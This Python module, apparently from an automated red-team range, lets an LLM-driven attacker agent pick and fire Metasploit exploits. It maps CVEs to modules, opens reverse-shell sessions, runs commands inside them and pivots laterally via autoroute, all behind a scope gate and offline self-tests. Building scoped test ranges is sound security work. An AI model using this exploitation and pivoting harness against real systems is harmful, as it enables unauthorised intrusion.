"""Metasploit integration (spec 04) — the real red arsenal, fully mediated.

Metasploit is both the arsenal and the breadth multiplier: it turns the pool's
modeled T2 services into real T1 targets without a hand-written exploit per CVE.
This module is the thin RPC client plus the GATED executor that plugs MSF into the
repo's four contracts and bypasses NONE of them:

  1. GATE-MEDIATED.   A module fires ONLY through `gated_msf_exploit`, which routes
     the target through `gate.dispatch("red","msf",target=H,...)`. An out-of-scope
     host is default-denied and the module never runs. msfrpcd is never reachable
     to red around the gate.
  2. SPINE-CONFIRMED. An opened Meterpreter/shell session is the out-of-band
     observable (the analogue of Incalmo's sandcat roster): it exists on the MSF
     server independent of red's narration. No session -> no `mutate`. A session is
     confirmed with `observed_by="msf", simulated=False`.
  3. XBOW-GROUNDED.   A session alone is NOT proof (MSF reports optimistically). A
     marker/`id` command runs INSIDE the session and its REAL output must pass
     `swarm.polymorph.validate_finding`. An ungrounded session is a FAILURE, never a
     faked-real success.
  4. FRONTIER-DRIVEN. `candidate_modules(cve)` maps a service discovered by
     `live_recon` to candidate modules; the LLM planner chooses among them over the
     frontier; this executor fires the chosen one. Red stays objective-blind.

msfrpcd + session management IS the real C2 (implants are sessions; tasking is
in-session module/post execution; results return over the session), which resolves
the full-C2 requirement for the live range.

BACKEND SEAM (why this is dry-testable without msfrpcd). The client talks to a
`backend` object, not to `pymetasploit3` directly. The real backend
(`Pymetasploit3Backend`) is a thin lazy wrapper over the RPC library and is used on
the live box. `FakeMsfBackend` is a deterministic in-memory double used by the
self-test and by the dry vetting path: it opens a session only for a known
(module,rhost) pair and returns a real-shaped `id` output, so every contract above
is EXERCISED offline. Booting a real msfrpcd and firing a real module against a
booted image is a LIVE run (Docker + msfrpcd) and is gated on Dante's go — the code
path is identical, only the backend swaps.
"""
import hashlib
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from swarm import spine                       # noqa: E402
from swarm.polymorph import validate_finding  # noqa: E402

# Hard ceilings — MSF modules and in-session commands hang; every RPC is bounded.
MODULE_TIMEOUT_S = 90
SESSION_CMD_TIMEOUT_S = 20
HEALTH_TIMEOUT_S = 10


class MsfError(RuntimeError):
    """msfrpcd unreachable, a module errored, or an RPC exceeded its hard timeout."""


# ── Frontier mapping: discovered CVE -> candidate MSF module(s) ────────────────
# Keyed on the CVE a `live_recon` fingerprint reports. The planner chooses among
# the candidates over the frontier; red never sees the topology IR. Extend this as
# the pool's T2 services are promoted to real T1 images (spec 03/04).
# NOTE (module-name provenance): every string below is CONFIRMED against the box's
# Metasploit (Framework 6.5.7-dev, via the metasploitframework/metasploit-framework
# container, digest sha256:10dc1027...) with `search cve:<cve>` on 2026-10-21 (Phase B).
# The Confluence entry carries the real Rapid7 module name, not the invented
# `*_rce_cve_2022_26134` placeholder.
SERVICE_MODULE_MAP = {
    "CVE-2017-5638":  ["exploit/multi/http/struts2_content_type_ognl"],
    # CVE-2017-10271 (WebLogic) is earned T1 via `live_weapon.exploit_weblogic` (wls-wsat
    # XMLDecoder), not MSF. The old mapping pointed at the CVE-2019-2725 module, which
    # is a DIFFERENT CVE — dropped rather than mislabel it. Re-add only with a wls-wsat
    # module name confirmed against the live MSF in Phase B.
    "CVE-2021-41773": ["exploit/multi/http/apache_normalize_path_rce"],
    # Citrix ADC/NetScaler runs on FreeBSD, so the session exploit is under freebsd/,
    # NOT linux/ (Phase B: `exploit/linux/http/citrix_dir_traversal_rce` does not exist).
    "CVE-2019-19781": ["exploit/freebsd/http/citrix_dir_traversal_rce"],
    "CVE-2022-26134": ["exploit/multi/http/atlassian_confluence_namespace_ognl_injection"],
    "CVE-2021-22205": ["exploit/multi/http/gitlab_exif_rce"],
    "CVE-2021-21972": ["exploit/multi/http/vmware_vcenter_uploadova_rce"],
    "CVE-2021-44228": ["exploit/multi/http/log4shell_header_injection"],
    # CVE-2018-13379 (FortiGate) removed: the only mapped module was
    # `auxiliary/scanner/http/fortinet_ssl_vpn_cred_read`, an auxiliary cred-read that
    # opens NO session, so `gated_msf_exploit` could never ground it. FortiGate stays
    # T2-modeled; a separate auxiliary path (cred-read, not session) is future work.
}


def candidate_modules(cve):
    """The vetted SEED of MSF modules a known CVE affords — confirmed-good module names we
    trust first. No longer the LIMIT: `select_exploit_modules` searches the live Metasploit
    catalog from what red fingerprinted and seeds it with this. Empty when the CVE is not
    in the vetted map (then selection leans entirely on the live catalog)."""
    return list(SERVICE_MODULE_MAP.get((cve or "").upper(), []))


# Metasploit module rank order (higher rank = more reliable), best first.
_RANK_ORDER = {"excellent": 0, "great": 1, "good": 2, "normal": 3,
               "average": 4, "low": 5, "manual": 6, "": 7}


def select_exploit_modules(client, *, cve=None, service=None, version=None, product=None,
                           limit=8):
    """Fingerprint-driven module selection against the LIVE Metasploit catalog — red is a
    real operator, not a fixed CVE list. Red narrows by what it DISCOVERED (a CVE it
    researched, or the service/product/version it fingerprinted on the open port) and
    searches msfrpcd's own module database; the vetted `SERVICE_MODULE_MAP` is a trusted
    seed placed first, never the ceiling. Results are ranked best-first (excellent>great>…).
    Falls back to the seed alone when no live catalog is reachable (offline/dry). Selection
    changes nothing about enforcement: whatever red picks still fires through the gate
    (`gated_msf_exploit`) and only grounds on a real session."""
    seed = candidate_modules(cve)
    query = f"cve:{cve}" if cve else " ".join(p for p in (product, service, version) if p)
    hits = []
    if client is not None and query.strip():
        try:
            raw = client.search_modules(query)
        except MsfError:
            raw = []
        raw = sorted(raw or [], key=lambda r: _RANK_ORDER.get(str(r.get("rank", "")).lower(), 7))
        hits = [r["module"] for r in raw if r.get("module")]
    ordered = list(seed) + [m for m in hits if m not in seed]
    return ordered[:limit] if limit else ordered


# ── Backends ───────────────────────────────────────────────────────────────────
class FakeMsfBackend:
    """Deterministic in-memory MSF double for dry tests and the dry vetting path.

    A session opens ONLY for a (module, rhost) pair registered via `arm()`; any other
    target returns no session (so the no-session->no-mutate law is exercised honestly).
    In-session commands return registered output; an unregistered command returns "".
    Nothing here ever reaches a network — it never claims a REAL pop by itself; the
    CALLER still has to ground the output through `validate_finding`."""

    simulated = True   # a dry double is never a real out-of-band observer (honesty)

    def __init__(self):
        self._armed = {}       # (module, rhost) -> {rport, output_by_cmd}
        self._sessions = {}     # session_id -> (module, rhost)
        self._next = 1
        self.healthy = True

    def arm(self, module, rhost, *, id_output="uid=0(root) gid=0(root) groups=0(root)",
            extra_cmds=None):
        self._armed[(module, rhost)] = {"id": id_output, **(extra_cmds or {})}
        return self

    def health(self):
        return self.healthy

    def module_run(self, module, rhost, rport, options, timeout=MODULE_TIMEOUT_S):
        if not self.healthy:
            raise MsfError("fake msfrpcd marked unhealthy")
        if (module, rhost) not in self._armed:
            return {"session_id": None, "raw": f"no session ({module} vs {rhost})"}
        sid = self._next
        self._next += 1
        self._sessions[sid] = (module, rhost)
        return {"session_id": sid, "raw": f"session {sid} opened"}

    def session_run(self, session_id, command, timeout=SESSION_CMD_TIMEOUT_S):
        if session_id not in self._sessions:
            raise MsfError(f"no such session {session_id}")
        module, rhost = self._sessions[session_id]
        return self._armed[(module, rhost)].get(command.strip().split()[0], "")

    def sessions(self):
        return dict(self._sessions)

    def search(self, query):
        """Mock catalog: answer from the vetted map so offline selection is testable.
        A `cve:<id>` query returns that CVE's seed modules; a keyword query substring-matches
        module paths. Never reaches a network."""
        q = (query or "").lower()
        out = []
        if q.startswith("cve:"):
            cve = query.split(":", 1)[1].strip().upper()
            for m in SERVICE_MODULE_MAP.get(cve, []):
                out.append({"module": m, "rank": "excellent", "name": m.rsplit("/", 1)[-1]})
        else:
            for mods in SERVICE_MODULE_MAP.values():
                for m in mods:
                    if q and q in m.lower():
                        out.append({"module": m, "rank": "great", "name": m.rsplit("/", 1)[-1]})
        return out


class Pymetasploit3Backend:
    """Thin lazy wrapper over `pymetasploit3.msfrpc` (the LIVE box only).

    Importing this module never imports pymetasploit3; the dependency is pulled only
    when a real backend is actually constructed, so `make test` (no MSF installed)
    still imports `swarm.msf` cleanly. Every call is wrapped with a hard wall-clock
    timeout because MSF RPC can block indefinitely."""

    simulated = False   # a live msfrpcd session IS a real out-of-band observer

    def __init__(self, host="127.0.0.1", port=55553, password=None, ssl=False):
        try:
            from pymetasploit3.msfrpc import MsfRpcClient  # noqa: F401
        except Exception as e:  # pragma: no cover - exercised only on the live box
            raise MsfError(f"pymetasploit3 not available: {e}")
        if not password:
            raise MsfError("msfrpcd password required (never hardcode; pass at runtime)")
        from pymetasploit3.msfrpc import MsfRpcClient
        try:
            self._c = MsfRpcClient(password, server=host, port=port, ssl=ssl)
        except Exception as e:  # pragma: no cover
            raise MsfError(f"msfrpcd unreachable at {host}:{port}: {e}")

    def health(self):  # pragma: no cover - live only
        try:
            _ = self._c.core.version
            return True
        except Exception:
            return False

    def module_run(self, module, rhost, rport, options, timeout=MODULE_TIMEOUT_S):  # pragma: no cover - live only
        # Fire through the msfrpcd CONSOLE API — the faithful equivalent of msfconsole's
        # `exploit -z`, and the only path that actually grounds in practice. The two
        # alternatives both fail: the `ModuleExecute` RPC returns job_id=None for native
        # staged payloads (e.g. linux/x64/shell_reverse_tcp), and pymetasploit3's
        # `ExploitModule.execute()` wrongly rejects valid payloads via a stale
        # payload-compat check (`self.payloads`). The console bypasses both and lets
        # msfrpcd start the payload handler itself, exactly as the interactive console does.
        opts = dict(options or {})
        payload_name = None
        target = None
        for k in list(opts):
            if k.upper() == "PAYLOAD":
                payload_name = opts.pop(k)
            elif k.upper() == "TARGET":
                target = opts.pop(k)
        mod_path = module if module.startswith(("exploit/", "auxiliary/")) else f"exploit/{module}"

        con = self._c.consoles.console()

        def _settle(limit=30):
            # Wait until the console is IDLE, draining its output. `read()` alone is not a reliable
            # idle signal (and it clears the buffer); the console's `is_busy()` (ConsoleList) is.
            out = ""
            end = time.time() + limit
            while time.time() < end:
                try:
                    out += (con.read() or {}).get("data", "")
                except Exception:                            # noqa: BLE001
                    pass
                try:
                    if not con.is_busy():
                        break
                except Exception:                            # noqa: BLE001
                    break
                time.sleep(0.5)
            return out

        try:
            setup = [f"use {mod_path}", f"set RHOSTS {rhost}"]
            if rport:
                setup.append(f"set RPORT {int(rport)}")
            # TARGET only when a NON-default is requested: `set TARGET` can force a
            # payload auto-switch on some modules (gitlab_exif_rce) and break the fire;
            # the default target (0) is left untouched. Set before PAYLOAD (msfconsole norm).
            if target not in (None, "", "0", 0):
                setup.append(f"set TARGET {int(target)}")
            if payload_name:
                setup.append(f"set PAYLOAD {payload_name}")
            for k, v in opts.items():            # LHOST/LPORT/SSL/TARGETURI/... (LHOST already an IP)
                setup.append(f"set {k} {v}")
            before = set(self._c.sessions.list.keys())
            # Apply each command and WAIT for the console to finish it before the next / before
            # firing. A single batched write with `exploit -z` appended RACES: the console runs
            # `exploit` before `set PAYLOAD` registers, so msf fires with NO payload configured and
            # defaults to a windows/meterpreter stub that never lands on a linux target (diagnosed
            # live 2026-10-28). Spacing the commands (is_busy gate) sets the payload reliably.
            buf = _settle()                       # drain the module-load banner
            for line in setup:
                con.write(line + "\n")
                buf += _settle()
            con.write("exploit -z\n")             # payload set + settled; now fire (background)
            deadline = time.time() + timeout
            while time.time() < deadline:
                try:
                    buf += (con.read() or {}).get("data", "")
                except Exception:
                    pass
                new = set(self._c.sessions.list.keys()) - before
                if new:
                    sid = sorted(new)[0]
                    time.sleep(5)  # let the shell initialize before the caller runs commands
                    return {"session_id": sid, "raw": buf[-400:]}
                time.sleep(2)
            return {"session_id": None, "raw": f"no session within {timeout}s: {buf[-400:]}"}
        finally:
            try:
                con.destroy()
            except Exception:
                pass

    def session_run(self, session_id, command, timeout=SESSION_CMD_TIMEOUT_S):  # pragma: no cover - live only
        sess = self._c.sessions.session(session_id)
        time.sleep(1)
        try:
            sess.read()           # drain any banner/prior output
        except Exception:
            pass
        if not command.endswith("\n"):
            command += "\n"
        # A fresh native command-shell may not respond to the first write; re-issue the
        # command (idempotent for the read-only markers we run) until output appears.
        deadline = time.time() + timeout
        out = ""
        writes = 0
        while time.time() < deadline:
            if not out.strip() and writes < 5:
                try:
                    sess.write(command)
                except Exception:
                    pass
                writes += 1
            time.sleep(2)
            try:
                chunk = sess.read()
            except Exception:
                chunk = ""
            if chunk:
                out += chunk
            if out.strip():
                break
        return out

    def sessions(self):  # pragma: no cover - live only
        return dict(self._c.sessions.list)

    def search(self, query):  # pragma: no cover - live only
        """Query the LIVE Metasploit module catalog (msfrpcd). Returns exploit modules as
        {module, rank, name}; red narrows this by the fingerprint it discovered. The vetted
        map is only a seed — this is the real, full catalog."""
        try:
            res = self._c.modules.search(query)
        except Exception as e:
            raise MsfError(f"module search failed for {query!r}: {e}")
        out = []
        for r in (res or []):
            if r.get("type") == "exploit" and r.get("fullname"):
                out.append({"module": r["fullname"], "rank": r.get("rank", ""),
                            "name": r.get("name", "")})
        return out


class MsfClient:
    """The thin client the executor talks to. Wraps a backend and enforces the hard
    timeouts and the health-check; holds NO scope logic — mediation lives in the gate."""

    def __init__(self, backend):
        self.backend = backend

    def health_check(self):
        if not self.backend.health():
            raise MsfError("msfrpcd health-check failed")
        return True

    def run_module(self, module, rhost, rport=None, options=None, timeout=MODULE_TIMEOUT_S):
        return self.backend.module_run(module, rhost, rport, options or {}, timeout=timeout)

    def session_execute(self, session_id, command, timeout=SESSION_CMD_TIMEOUT_S):
        return self.backend.session_run(session_id, command, timeout=timeout)

    def sessions(self):
        return self.backend.sessions()

    def search_modules(self, query):
        return self.backend.search(query)

    # --- Incalmo-pattern wrappers: compat check + pivoting (metasploit_service.py) ---
    def module_options(self, module_fullname):
        """Load a module from msfrpcd and return its required_options + available payloads +
        targets — Incalmo's `get_exploit_module_options` (metasploit_service.py:57-73). Lets
        red check compatibility (does this exploit have a target for the host's arch?) BEFORE
        firing. `module_fullname` can be with or without the "exploit/" prefix: msfrpcd's
        `modules.use("exploit", <name>)` wants the bare name, so we strip it (Incalmo note at
        c2server/payloads/msf_rpc_client.py:43-50)."""
        if not hasattr(self.backend, "_c"):
            return None                          # offline backend (FakeMsfBackend): no live catalog
        bare = module_fullname
        if bare.startswith("exploit/"):
            bare = bare[len("exploit/"):]
        try:
            m = self.backend._c.modules.use("exploit", bare)
            return {"fullname": module_fullname,
                    "required_options": list(getattr(m, "required", []) or []),
                    "missing_required": list(getattr(m, "missing_required", []) or []),
                    "available_payloads": list(getattr(m, "targetpayloads")() or [])
                                          if hasattr(m, "targetpayloads") else [],
                    "targets": list(getattr(m, "targets", []) or [])}
        except Exception as e:                   # noqa: BLE001 — module unloadable / RPC error
            return {"fullname": module_fullname, "error": f"{type(e).__name__}: {e}"}

    def autoroute_add(self, session_id, subnet=None, netmask=None, timeout=MODULE_TIMEOUT_S):
        """Pivot msfrpcd's own module traffic THROUGH `session_id` into the subnet reachable
        from that session — Incalmo's `autoroute_add` (metasploit_service.py:191-208). After
        this, a later `run_module` with an RHOST on that subnet uses the earned session as its
        route, so lateral MSF exploits from the entry's session actually reach inner hops.
        `subnet=None` uses `autoadd` (msfrpcd discovers the local subnet of the session)."""
        if not hasattr(self.backend, "_c"):
            return False                         # offline backend: pivoting is a live-only op
        opts = {"SESSION": int(session_id)}
        if subnet:
            opts["SUBNET"] = subnet
            if netmask:
                opts["NETMASK"] = netmask
            opts["CMD"] = "add"
        else:
            opts["CMD"] = "autoadd"
        try:
            # Not a session module; it needs an in-session command to run. The post/multi/manage
            # /autoroute auxiliary is driven through the console (same path as module_run) so
            # we reuse that machinery; it is quick (<10s), so a short timeout is fine.
            con = self.backend._c.consoles.console()
            try:
                lines = ["use post/multi/manage/autoroute",
                         f"set SESSION {opts['SESSION']}",
                         f"set CMD {opts['CMD']}"]
                if "SUBNET" in opts:
                    lines.append(f"set SUBNET {opts['SUBNET']}")
                if "NETMASK" in opts:
                    lines.append(f"set NETMASK {opts['NETMASK']}")
                lines.append("run")
                con.write("\n".join(lines) + "\n")
                deadline = time.time() + timeout
                buf = ""
                while time.time() < deadline:
                    try:
                        buf += (con.read() or {}).get("data", "")
                    except Exception:
                        pass
                    if "Route added" in buf or "already exists" in buf or "AutoAdding" in buf:
                        return True
                    time.sleep(1)
                return bool(buf.strip())         # best-effort: non-empty output means it ran
            finally:
                try:
                    con.destroy()
                except Exception:
                    pass
        except Exception:                        # noqa: BLE001
            return False


# ── The gated executor (the only path a module ever fires through) ──────────────
def gated_msf_exploit(gate, log, actor, target, *, client, module, rhost, rport=None,
                      options=None, cve=None, src_ip="red", marker_cmd="id",
                      kind="rce", timeout=None, state="foothold", src=None,
                      raise_on_block=False):
    """Fire `module` at `target` through the full floor. Returns a session handle dict
    on a GROUNDED pop, else False. Never raises OutOfScope out (a blocked target is a
    logged non-event); other MSF errors propagate as `MsfError`.

    The confirm->mutate spine advances state ONLY on: (1) a real session opened on the
    MSF server (spine-confirmed), AND (2) the in-session marker output grounding the
    claim via `validate_finding` (XBOW). Either missing => a real `foothold_failed`.

    `state`="foothold" (default, entry pop) or "lateral" (inner hop, exploit-per-hop) —
    writes the corresponding state.mutate; the failure action name is tagged accordingly
    (`foothold_failed` / `lateral_failed`), so the log reads honestly for either role.
    `src` is the vantage host NAME the lateral fires FROM (recorded on lateral mutate)."""
    from swarm.gate import OutOfScope

    fail_action = "lateral_failed" if state == "lateral" else "foothold_failed"

    def _fire():
        # Some exploits ground asynchronously (e.g. GitLab exif RCE is processed by a
        # background worker), so the per-fire timeout is overridable; default stays 90s.
        res = (client.run_module(module, rhost, rport=rport, options=options, timeout=timeout)
               if timeout else client.run_module(module, rhost, rport=rport, options=options))
        sid = res.get("session_id")
        if sid is None:
            # SPINE: no out-of-band session observable -> state cannot advance.
            log.append(actor, fail_action,
                       {"dst": target, "via": "msf", "module": module,
                        "reason": "no session opened", "raw": (res.get("raw") or "")[:160]})
            return False
        # XBOW: a session is not proof. Run the marker INSIDE the session and ground it.
        marker_out = client.session_execute(sid, marker_cmd)
        verdict = validate_finding({"output": marker_out}, log.entries(), kind)
        if not verdict["valid"]:
            log.append(actor, fail_action,
                       {"dst": target, "via": "msf", "module": module, "session_id": sid,
                        "reason": f"ungrounded session: {verdict['reason']}",
                        "marker_output": (marker_out or "")[:160]})
            return False
        # fidelity follows the BACKEND: a live msfrpcd session is a real observer
        # (simulated=False); the in-memory double is honestly SIMULATED-labeled. The
        # confirm->mutate control flow is identical either way — never faked-real.
        # FAIL SAFE: an undeclared backend defaults to SIMULATED (True), so a backend
        # that forgets to assert `simulated=False` can never be labeled real by default.
        simulated = getattr(client.backend, "simulated", True)
        c = spine.confirm(log, state, target, observed_by="msf", simulated=simulated,
                          method=f"msf:{module}", session_id=sid,
                          marker_cmd=marker_cmd, marker_output=(marker_out or "")[:160])
        mutate_extra = {"via": "msf", "module": module, "session_id": sid, "cve": cve,
                        "as_user": "session"}
        if state == "lateral" and src is not None:
            mutate_extra["src"] = src
        spine.mutate(log, actor, state, target, via_confirm=c["seq"], **mutate_extra)
        return {"session_id": sid, "module": module, "target": target, "grounded": True,
                "marker_output": marker_out}

    # Novelty marker (degeneracy A4): each (module, cve) weapon is a DISTINCT variant, so red trying
    # several real exploits to find the one that lands is NOVELTY, not a dead loop; an EXACT repeat of
    # a (module, cve) that already failed carries the SAME marker and still counts toward a loop.
    _prov = hashlib.sha256(f"{module}|{cve}".encode()).hexdigest()[:12]
    try:
        _meta = spine.coords(src_ip, target, rport or 0, "T1210", cve=cve, module=module)
        _meta["provenance_hash"] = _prov
        return gate.dispatch(actor, "msf", target, _fire, meta=_meta)
    except OutOfScope:
        # GATE: default-deny already logged a gate.block; the module never ran. By default we
        # swallow the exception for the entry-foothold path (which treats blocked as False), but
        # the lateral path wants to surface it as a distinct `blocked` outcome without retrying
        # other modules — pass raise_on_block=True there.
        if raise_on_block:
            raise
        return False


if __name__ == "__main__":  # self-check: the four contracts, offline (no msfrpcd)
    import tempfile
    from swarm.gate import Gate
    from swarm.eventlog import EventLog

    def _fresh(scope_red=("struts",)):
        tf = tempfile.NamedTemporaryFile(suffix=".jsonl", delete=False); tf.close()
        log = EventLog(tf.name)
        gate = Gate([], log, scope_by_actor={"red": list(scope_red)})
        return log, gate, tf.name

    MODULE = "exploit/multi/http/struts2_content_type_ognl"

    # Contract 4 (frontier-driven): discovered CVE -> candidate modules; unknown -> none.
    assert candidate_modules("CVE-2017-5638") == [MODULE], candidate_modules("CVE-2017-5638")
    assert candidate_modules("CVE-9999-0000") == []

    # Fingerprint-driven selection from the (mock) live catalog: the vetted seed comes
    # first, live-catalog hits follow, deduped and ranked — not limited to the hardcoded map.
    _cli = MsfClient(FakeMsfBackend())
    sel = select_exploit_modules(_cli, cve="CVE-2017-5638")
    assert sel and sel[0] == MODULE, sel                      # trusted seed first
    # a keyword fingerprint (no CVE) still finds modules from the live catalog
    sel_kw = select_exploit_modules(_cli, service="struts")
    assert MODULE in sel_kw, sel_kw
    # a CVE with no vetted seed leans entirely on the live catalog (seed empty, hits used)
    sel_nohit = select_exploit_modules(_cli, cve="CVE-9999-0000")
    assert sel_nohit == [], sel_nohit                         # mock catalog has nothing either
    # offline (no client) degrades to the seed alone — honest, never invents a module
    assert select_exploit_modules(None, cve="CVE-2021-41773") == \
        ["exploit/multi/http/apache_normalize_path_rce"]

    # Contract 1 (gate-mediated): an OUT-OF-SCOPE target is default-denied; the module
    # NEVER runs (no session, no confirm, no mutate), and a gate.block is logged.
    log, gate, p = _fresh(scope_red=("struts",))
    be = FakeMsfBackend().arm(MODULE, "10.0.0.9")   # armed, but target is out of scope
    out = gated_msf_exploit(gate, log, "red", "decoy_oos", client=MsfClient(be),
                            module=MODULE, rhost="10.0.0.9", rport=8080, cve="CVE-2017-5638")
    E = log.entries()
    assert out is False, out
    assert any(e["action"] == "gate.block" for e in E), "no gate.block for oos target"
    assert not any(e["action"] == "state.mutate" for e in E), "oos target mutated state!"
    Path(p).unlink()

    # Contract 2 (spine-confirmed): in scope but the module opens NO session -> a real
    # foothold_failed, and state does NOT advance.
    log, gate, p = _fresh(scope_red=("struts",))
    be = FakeMsfBackend()   # NOT armed -> no session
    out = gated_msf_exploit(gate, log, "red", "struts", client=MsfClient(be),
                            module=MODULE, rhost="10.0.0.5", rport=8080, cve="CVE-2017-5638")
    E = log.entries()
    assert out is False
    assert any(e["action"] == "gate.allow" for e in E), "in-scope target should pass the gate"
    assert any(e["action"] == "foothold_failed"
               and e["data"]["reason"] == "no session opened" for e in E), E[-1]
    assert not any(e["action"] == "state.mutate" for e in E), "no session but state mutated!"
    Path(p).unlink()

    # Contract 3 (XBOW-grounded): a session opens but the marker output does NOT ground
    # the claim (no uid=/RCE indicator) -> ungrounded, failure, no mutate. Never faked-real.
    log, gate, p = _fresh(scope_red=("struts",))
    be = FakeMsfBackend().arm(MODULE, "10.0.0.5", id_output="permission denied")
    out = gated_msf_exploit(gate, log, "red", "struts", client=MsfClient(be),
                            module=MODULE, rhost="10.0.0.5", rport=8080, cve="CVE-2017-5638")
    E = log.entries()
    assert out is False
    ff = [e for e in E if e["action"] == "foothold_failed"]
    assert ff and "ungrounded session" in ff[-1]["data"]["reason"], ff
    assert not any(e["action"] == "state.mutate" for e in E), "ungrounded session mutated state!"
    Path(p).unlink()

    # The happy path: in scope, session opens, marker grounds -> confirm(observed_by=msf,
    # real) THEN mutate(foothold, via_confirm). The spine law holds (every mutate has a
    # prior confirm). This is the whole MSF contract, offline.
    log, gate, p = _fresh(scope_red=("struts",))
    be = FakeMsfBackend().arm(MODULE, "10.0.0.5")   # default id_output = uid=0(root)...
    out = gated_msf_exploit(gate, log, "red", "struts", client=MsfClient(be),
                            module=MODULE, rhost="10.0.0.5", rport=8080, cve="CVE-2017-5638")
    E = log.entries()
    assert out and out["grounded"] and out["session_id"], out
    conf = [e for e in E if e["action"] == "confirm" and e["data"]["confirms"] == "foothold"]
    mut = [e for e in E if e["action"] == "state.mutate" and e["data"]["state"] == "foothold"]
    assert conf and conf[-1]["data"]["observed_by"] == "msf", conf
    # honesty: over the fake backend the confirm is SIMULATED-labeled, never faked-real;
    # a LIVE msfrpcd session (Pymetasploit3Backend.simulated=False) is fidelity="real".
    assert conf[-1]["data"]["fidelity"] == "SIMULATED", conf
    assert mut and mut[-1]["data"]["via_confirm"] == conf[-1]["seq"], (mut, conf)
    assert spine.audit_spine(E) == [], spine.audit_spine(E)
    Path(p).unlink()

    # The client enforces the health-check (a down msfrpcd fails loud, never silent).
    down = FakeMsfBackend(); down.healthy = False
    try:
        MsfClient(down).health_check()
        raise SystemExit("health_check passed on a down backend")
    except MsfError:
        pass

    print("msf ok (4 contracts offline: gate default-deny on oos; no session->no mutate; "
          "ungrounded session->failure; grounded->confirm(msf)->mutate, spine clean; fidelity "
          "follows backend (fake=SIMULATED, live=real; never faked-real); health-check loud). "
          "pymetasploit3 import is lazy; live msfrpcd fire is gated.")
